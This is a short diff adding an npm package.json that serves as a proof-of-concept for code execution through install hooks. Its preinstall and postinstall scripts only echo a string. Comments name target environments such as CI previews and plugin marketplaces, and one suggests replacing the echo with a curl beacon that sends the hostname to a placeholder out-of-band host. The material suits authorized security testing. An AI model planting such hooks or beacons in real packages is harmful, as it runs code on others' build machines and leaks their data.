@@ -1,0 +1,12 @@
+{
+  "_comment": "Safe PoC -> x8bitranjit. npm install-hook PoC - benign echo only.",
+  "_what": "If a target lets you upload a PROJECT/REPO that runs npm install (CI previews, plugin installers, sandboxed builders), the preinstall hook executes as the build user.",
+  "_where": "plugin/theme marketplace uploads, CI preview builds, self-hosted runners",
+  "_edit": "replace echo with an OOB beacon (curl http://YOUR-OOB-HOST.example.invalid/$(hostname)) on authorized targets",
+  "name": "safepoc-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "echo Safe PoC -> x8bitranjit",
+    "postinstall": "echo Safe PoC -> x8bitranjit"
+  }
+}
